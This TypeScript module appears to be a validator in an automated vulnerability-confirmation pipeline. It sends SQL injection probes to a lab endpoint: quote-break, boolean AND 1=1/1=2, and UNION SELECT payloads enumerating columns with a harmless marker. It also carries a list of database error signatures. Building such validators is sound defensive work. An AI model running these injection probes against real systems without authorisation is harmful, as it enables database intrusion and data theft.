/**
 * Gate 1 SQL-injection validator (Architecture §3.1, §3.5, §4.5).
 *
 * DETERMINISTIC and NON-LLM by construction: this module sends fixed HTTP
 * probes, compares them against a captured baseline with plain string/regex
 * checks, and returns a verdict. No model judgment is anywhere in the gate —
 * that is the whole point of Gate 1 (invariant 1). The reasoning core may
 * only choose *what* to point this at; it can never supply the verdict.
 *
 * It answers the two separate questions §4.5 requires, and the verdict needs
 * BOTH:
 *   - technical signal (it EXISTS): a database error string surfaced by a
 *     syntax-breaking payload, or a boolean true/false response differential.
 *   - impact artifact (it MATTERS): a UNION-injected, self-generated marker
 *     reflected back in the response, proving attacker-controlled data can be
 *     returned from the query.
 *
 * Restraint (§4.5): the impact step injects a marker WE generate and harvests
 * nothing real — it proves the door opens (arbitrary data can be extracted)
 * without walking through it (dumping the actual users table). The lab target
 * has a real `users` table; the validator never reads it.
 *
 * Verifiable-step chaining (§3.5): the confirmation is a chain of small,
 * independently-checked links (baseline reachable → error signal → boolean
 * differential → marker extraction), each recorded as its own step, rather
 * than one end-of-run claim.
 *
 * This module is pure: it performs no DB writes and touches no filesystem.
 * Persisting evidence and writing the `validations` row / promoting the
 * finding is the caller's job (see ./index.ts), keeping the decision logic
 * isolated and unit-testable.
 */

const REQUEST_TIMEOUT_MS = 5000;
const MAX_BODY_CHARS = 4000;
const MAX_UNION_COLUMNS = 8;

/** Case-insensitive signatures of database error messages across the common
 * engines, so the validator is not SQLite-specific. A match that is present
 * in an attack response but absent from the baseline is the error-based
 * technical signal. */
const SQL_ERROR_SIGNATURES: RegExp[] = [
	/unrecognized token/i,
	/SQLITE_ERROR/i,
	/no such column/i,
	/syntax error/i,
	/SQL syntax/i,
	/unterminated quoted string/i,
	/quoted string not properly terminated/i,
	/unclosed quotation mark/i,
	/incorrect syntax near/i,
	/you have an error in your SQL syntax/i,
	/mysql_fetch/i,
	/ORA-\d{5}/i,
	/PostgreSQL.*ERROR/i,
	/PG::\w+/i,
	/Microsoft SQL Server/i,
];

export interface SqliTarget {
	/** Full endpoint URL without the injected query param, e.g.
	 * "http://127.0.0.1:8888/item". */
	endpoint: string;
	/** The query parameter that is the injection point, e.g. "id". */
	param: string;
	/** A known-good value for that parameter, e.g. "1" — the baseline. */
	baselineValue: string;
}

export interface CapturedExchange {
	label: string;
	requestUrl: string;
	payload: string;
	status: number;
	body: string;
	networkError?: string;
}

export interface VerifiableStep {
	name: string;
	passed: boolean;
	detail: string;
}

export interface SqliValidationReport {
	validator: "sqli";
	passed: boolean;
	technicalSignal: { errorBased: boolean; booleanDifferential: boolean };
	impactArtifact: { extracted: boolean; marker: string | null; unionColumns: number | null };
	diffSummary: string;
	baseline: CapturedExchange;
	attacks: CapturedExchange[];
	steps: VerifiableStep[];
}

function buildUrl(target: SqliTarget, payload: string): string {
	const url = new URL(target.endpoint);
	url.searchParams.set(target.param, payload);
	return url.toString();
}

async function probe(target: SqliTarget, label: string, payload: string): Promise<CapturedExchange> {
	const requestUrl = buildUrl(target, payload);
	const controller = new AbortController();
	const timer = setTimeout(() => controller.abort(), REQUEST_TIMEOUT_MS);
	try {
		const res = await fetch(requestUrl, { signal: controller.signal });
		const body = (await res.text()).slice(0, MAX_BODY_CHARS);
		return { label, requestUrl, payload, status: res.status, body };
	} catch (err) {
		return {
			label,
			requestUrl,
			payload,
			status: 0,
			body: "",
			networkError: err instanceof Error ? err.message : String(err),
		};
	} finally {
		clearTimeout(timer);
	}
}

function matchedErrorSignature(body: string): string | null {
	for (const sig of SQL_ERROR_SIGNATURES) {
		if (sig.test(body)) {
			return sig.source;
		}
	}
	return null;
}

function makeMarker(): string {
	// A per-validation nonce so a reflected marker cannot be coincidence.
	const rand = Math.random().toString(36).slice(2, 10).toUpperCase();
	return `PLUTO${rand}SQLI`;
}

function unionPayload(baselineValue: string, columns: number, marker: string): string {
	const cols = Array.from({ length: columns }, () => `'${marker}'`).join(",");
	// `AND 1=2` nulls out the original row set so only the UNION rows can match,
	// making a reflected marker unambiguous. `-- -` comments out any trailing SQL.
	return `${baselineValue} AND 1=2 UNION SELECT ${cols}-- -`;
}

export async function validateSqli(target: SqliTarget): Promise<SqliValidationReport> {
	const steps: VerifiableStep[] = [];
	const attacks: CapturedExchange[] = [];

	// Step 1 — baseline reachable and well-formed.
	const baseline = await probe(target, "baseline", target.baselineValue);
	const baselineOk = baseline.networkError === undefined && baseline.status > 0 && baseline.status < 500;
	steps.push({
		name: "baseline-reachable",
		passed: baselineOk,
		detail: baseline.networkError
			? `baseline request failed: ${baseline.networkError}`
			: `baseline HTTP ${baseline.status}`,
	});
	if (!baselineOk) {
		return finish(false, baseline, attacks, steps, {
			errorBased: false,
			booleanDifferential: false,
			extracted: false,
			marker: null,
			unionColumns: null,
		});
	}
	const baselineHasSqlError = matchedErrorSignature(baseline.body) !== null;

	// Step 2 — error-based technical signal.
	const errorProbe = await probe(target, "error-probe", `${target.baselineValue}'`);
	attacks.push(errorProbe);
	const errorSig = matchedErrorSignature(errorProbe.body);
	const errorBased = errorSig !== null && !baselineHasSqlError;
	steps.push({
		name: "error-signal",
		passed: errorBased,
		detail: errorBased
			? `DB error signature /${errorSig}/ surfaced by quote-break payload (absent in baseline)`
			: "no new database error signature surfaced by a quote-break payload",
	});

	// Step 3 — boolean true/false differential technical signal.
	const truthy = await probe(target, "boolean-true", `${target.baselineValue} AND 1=1`);
	const falsy = await probe(target, "boolean-false", `${target.baselineValue} AND 1=2`);
	attacks.push(truthy, falsy);
	const trueMatchesBaseline = truthy.body.trim() === baseline.body.trim();
	const falseDiffers = falsy.body.trim() !== baseline.body.trim();
	const trueFalseDiffer = truthy.body.trim() !== falsy.body.trim();
	const booleanDifferential = trueMatchesBaseline && falseDiffers && trueFalseDiffer;
	steps.push({
		name: "boolean-differential",
		passed: booleanDifferential,
		detail: booleanDifferential
			? "AND 1=1 reproduced the baseline response while AND 1=2 diverged — injected boolean controls the query"
			: "no boolean true/false response differential observed",
	});

	const technicalSignal = errorBased || booleanDifferential;

	// Step 4 — impact artifact: reflect a self-generated UNION marker.
	const marker = makeMarker();
	const baselineHasMarker = baseline.body.includes(marker);
	let extracted = false;
	let unionColumns: number | null = null;
	for (let columns = 1; columns <= MAX_UNION_COLUMNS; columns++) {
		const union = await probe(target, `union-${columns}col`, unionPayload(target.baselineValue, columns, marker));
		attacks.push(union);
		if (!baselineHasMarker && union.body.includes(marker)) {
			extracted = true;
			unionColumns = columns;
			break;
		}
	}
	steps.push({
		name: "marker-extraction",
		passed: extracted,
		detail: extracted
			? `UNION-injected marker ${marker} reflected in response at ${unionColumns} column(s) — attacker-controlled data extraction (no real data harvested)`
			: `self-generated marker ${marker} was never reflected via UNION injection`,
	});

	const passed = technicalSignal && extracted;
	return finish(passed, baseline, attacks, steps, {
		errorBased,
		booleanDifferential,
		extracted,
		marker,
		unionColumns,
	});
}

function finish(
	passed: boolean,
	baseline: CapturedExchange,
	attacks: CapturedExchange[],
	steps: VerifiableStep[],
	flags: {
		errorBased: boolean;
		booleanDifferential: boolean;
		extracted: boolean;
		marker: string | null;
		unionColumns: number | null;
	},
): SqliValidationReport {
	return {
		validator: "sqli",
		passed,
		technicalSignal: { errorBased: flags.errorBased, booleanDifferential: flags.booleanDifferential },
		impactArtifact: { extracted: flags.extracted, marker: flags.marker, unionColumns: flags.unionColumns },
		diffSummary: summarize(passed, flags),
		baseline,
		attacks,
		steps,
	};
}

function summarize(
	passed: boolean,
	flags: { errorBased: boolean; booleanDifferential: boolean; extracted: boolean; marker: string | null },
): string {
	if (!passed) {
		const missing: string[] = [];
		if (!flags.errorBased && !flags.booleanDifferential) {
			missing.push("no technical signal (neither DB error nor boolean differential)");
		}
		if (!flags.extracted) {
			missing.push("no impact artifact (marker not extracted)");
		}
		return `NOT reproduced: ${missing.join("; ")}.`;
	}
	const technical: string[] = [];
	if (flags.errorBased) technical.push("DB error string");
	if (flags.booleanDifferential) technical.push("boolean true/false differential");
	return (
		`Reproduced. Technical signal: ${technical.join(" + ")}. ` +
		`Impact artifact: UNION-injected marker ${flags.marker} reflected (attacker-controlled extraction, no real data harvested).`
	);
}
